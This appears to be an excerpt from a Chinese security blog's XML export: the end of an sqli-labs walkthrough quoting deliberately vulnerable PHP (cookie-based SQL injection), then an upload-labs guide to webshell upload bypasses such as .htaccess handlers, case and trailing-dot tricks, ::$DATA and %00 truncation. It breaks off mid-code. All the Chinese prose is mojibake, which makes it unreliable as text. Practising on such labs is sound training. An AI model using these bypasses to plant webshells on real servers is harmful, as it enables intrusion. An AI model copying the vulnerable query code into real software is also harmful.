title="Less-21"></a>Less-21</h2><p>è¿™ä¸ªå’Œä¸Šé¢çš„æ²¡å•¥å·®åˆ«ï¼Œåªä¸è¿‡å°†uname base64åŠ å¯†äº†</p><h3 id="å…³é”®ä»£ç -20"><a href="#å…³é”®ä»£ç -20" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">    &#123;</span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ctype_digit($value))       <span class="comment">// Quote if not a number</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">        $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">        $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode($row1[<span class="string">&#x27;username&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &#x27;Your Cookie is: &#x27; .$cookee;</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee = $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            $format = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">            $timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-21.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date($format, $timestamp);</span><br><span class="line"></span><br><span class="line">            $cookee = base64_decode($cookee);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            $sql=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">            $result=mysql_query($sql);</span><br><span class="line">            <span class="keyword">if</span> (!$result)</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                    &#125;</span><br><span class="line">            $row = mysql_fetch_array($result);</span><br><span class="line">            <span class="keyword">if</span>($row)</span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .$row[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">                    <span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span></span><br><span class="line">                    &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">                            setcookie(<span class="string">&#x27;uname&#x27;</span>, base64_encode($row1[<span class="string">&#x27;username&#x27;</span>]), time()<span class="number">-3600</span>);</span><br><span class="line">                            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    $fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite($fp,<span class="string">&#x27;Cookie:&#x27;</span>.$cookee.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>è¿™ä¸ªé—­åˆæ–¹å¼å˜æˆåŒå¼•å·å°±è¡Œäº†ï¼Œ20å…³çš„å››ç§æ³¨å…¥éƒ½è¡Œ</p><h3 id="å…³é”®ä»£ç -21"><a href="#å…³é”®ä»£ç -21" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = base64_decode($cookee);</span><br><span class="line">$cookee1 = <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labsé¶åœºé€šå…³æ‰‹å†Œ</title>
      <link href="2019/10/16/upload-labs-wp/"/>
      <url>2019/10/16/upload-labs-wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä»‹ç»äº†uploadlabsé¶åœºé€šå…³æŒ‡å—ï¼ä¸ºäº†æ–¹ä¾¿æ˜¾ç¤ºï¼Œè¿™é‡ŒæŠŠä¸€å¥è¯å†™æˆphpinfo,å¹¶ä½¿ç”¨bpæŠ“åŒ…!</p><a id="more"></a><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>æœ¬åœ°jsæ£€éªŒ</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ä¸Šä¼ webshellæ—¶å°†å…¶åç¼€æ”¹ä¸º.jpgæˆ–.pngæˆ–.gif,å†ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€</p><p>ä¿®æ”¹jsä»£ç ï¼ŒF12ä»£å¼€å¼€å‘äººå‘˜å·¥å…·ï¼Œä¿®æ”¹checkFile()å‡½æ•°</p><p><img src="/2019/10/16/upload-labs-wp/20190926221545.png"></p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>MIMEç±»å‹æ£€æµ‹</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ä¸Šä¼ webshellæ—¶å°†å…¶åç¼€æ”¹ä¸º.jpgæˆ–.pngæˆ–.gif,å†ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€</p><p><img src="/2019/10/16/upload-labs-wp/20190926222235.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>ç‰¹æ®Šåç¼€åç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>å› ä¸ºæ²¡æœ‰jsæ£€æµ‹ï¼Œç›´æ¥ä¸Šä¼ .phtmlåç¼€å°±å¯ä»¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰ä¸ªæ— æ³•æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œå³é”®å¯ä»¥è·å–åˆ°å›¾ç‰‡çš„åœ°å€</p><p><img src="/2019/10/16/upload-labs-wp/20190926224743.png"></p><p>å°†å…¶æ³¨é‡Šå–æ¶ˆé‡å¯Apacheå³å¯è§£æ</p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>.htaccessç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;xxx&quot;&gt;  </span><br><span class="line">        SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å†ä¸Šä¼ ä¸€ä¸ªtest.xxxæ–‡ä»¶(å†™å…¥webshell)ï¼Œtest.xxxå°±å¯ä»¥è¢«è§£ææˆphpä»£ç æ‰§è¡Œ</p><p><img src="/2019/10/16/upload-labs-wp/20190926225421.png"></p><p><img src="/2019/10/16/upload-labs-wp/20190926225837.png"></p><p><strong>æ³¨æ„ï¼š</strong>phpç‰ˆæœ¬é—®é¢˜å¯èƒ½ä¼šå¯¼è‡´è§£æå¤±è´¥ï¼Œäº²æµ‹php5.2.17å®Œç¾è§£æ</p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>å¤§å°å†™ç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ä¸Šä¼ ä¸º.Phpåç¼€çš„webshell</p><p><img src="/2019/10/16/upload-labs-wp/20190927103522.png"></p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>åç¼€åŠ ç©ºæ ¼ç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.phpåç¼€çš„webshell</p><p><img src="/2019/10/16/upload-labs-wp/20190927104647.png"></p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>windowsåŠ .ç»•è¿‡(å¯¹æ–‡ä»¶å‘½åæ—¶æœ€åä¸€ä¸ªå­—ç¬¦ä¸º.ä¼šè‡ªåŠ¨å¿½ç•¥)</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php.åç¼€</p><p><img src="/2019/10/16/upload-labs-wp/20190927105020.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>windows::$DATAç»•è¿‡ç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php::$DATAåç¼€</p><p><img src="/2019/10/16/upload-labs-wp/20190927105219.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>åç¼€åŠ . .ç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.php. .åç¼€</p><p><img src="/2019/10/16/upload-labs-wp/20190927105455.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>åŒå†™ç»•è¿‡</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><p>ç”¨bpæŠ“åŒ…å°†å…¶æ”¹ä¸º.pphphpåç¼€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">$file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æºç ä¸­å°†å¯ä»¥å½“æˆphpè§£æçš„åç¼€éƒ½æ›¿æ¢æˆç©ºäº†</p><p><strong>æ³¨æ„ï¼š</strong>æ–‡ä»¶åä¸­çš„å…³é”®è¯ä¹Ÿä¼šæ›¿æ¢</p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>%00æˆªæ–­ç»•è¿‡ç»•è¿‡ç™½åå•</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><pre><code>ç”¨bpæŠ“åŒ…å°†save_pathä¿å­˜ä¸ºï¼šsave_path=../upload/phpinfo.php%00$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;é€šè¿‡ä»£ç å®¡è®¡å¯ä»¥çœ‹å‡ºæ¥ï¼Œ$_GET[â€˜save_pathâ€™]å¯ä»¥ç”¨%00ç»•è¿‡</code></pre><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>äºŒè¿›åˆ¶00æˆªæ–­æ¼æ´ç»•è¿‡ç™½åå•</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><pre><code>ç”¨bpæŠ“åŒ…å°†save_pathä¿å­˜ä¸ºï¼šsave_path=../upload/phpinfo.php**ä»£è¡¨00å’Œåä¸€å…³ä¸åŒçš„æ˜¯è¿™æ¬¡çš„save_pathæ˜¯é€šè¿‡postä¼ è¿›æ¥çš„ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œä½†è¿™æ¬¡éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹ï¼Œå› ä¸ºpostä¸ä¼šåƒgetå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ã€‚</code></pre><p><img src="/2019/10/16/upload-labs-wp/20190927113754.png"></p><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p><strong>è€ƒå¯Ÿç‚¹ï¼š</strong>å›¾ç‰‡é©¬</p><p><strong>é€šå…³æ–¹æ³•ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file &#x3D; fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;åªè¯»2å­—èŠ‚</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);    </span><br><span class="line">    $fileType &#x3D; &#39;&#39;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType &#x3D; &#39;jpg&#39;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType &#x3D; &#39;png&#39;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType &#x3D; &#39;gif&#39;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType &#x3D; &#39;unknown&#39;;</span><br><span class="line">        &#125;    </span><br><span 